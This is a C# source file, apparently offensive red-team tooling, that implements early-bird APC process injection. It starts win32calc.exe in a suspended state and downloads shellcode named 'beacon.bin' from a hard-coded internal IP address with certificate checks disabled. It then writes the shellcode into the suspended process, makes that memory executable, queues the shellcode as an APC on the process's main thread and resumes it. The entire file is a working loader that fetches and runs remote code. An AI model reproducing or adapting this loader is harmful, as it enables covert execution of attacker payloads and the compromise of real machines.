using System;
using System.ComponentModel;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace QueueUserAPC
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            var si = new Win32.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new Win32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new Win32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new Win32.PROCESS_INFORMATION();

            var success = Win32.CreateProcessW(
                "C:\\Windows\\System32\\win32calc.exe",
                null,
                ref ta,
                ref pa,
                false,
                0x00000004, // CREATE_SUSPENDED
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref si,
                out pi);

            // If we failed to spawn the process, just bail
            if (!success)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            // Fetch shellcode
            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://10.10.0.69/beacon.bin");
                }
            }

            // Allocate memory
            var baseAddress = Win32.VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            // Write shellcode
            Win32.WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            // Flip memory protection
            Win32.VirtualProtectEx(
                pi.hProcess,
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            // Queue the APC
            Win32.QueueUserAPC(
                baseAddress, // point to the shellcode location
                pi.hThread,  // primary thread of process
                0);

            // Resume the thread
            Win32.ResumeThread(pi.hThread);
        }
    }
}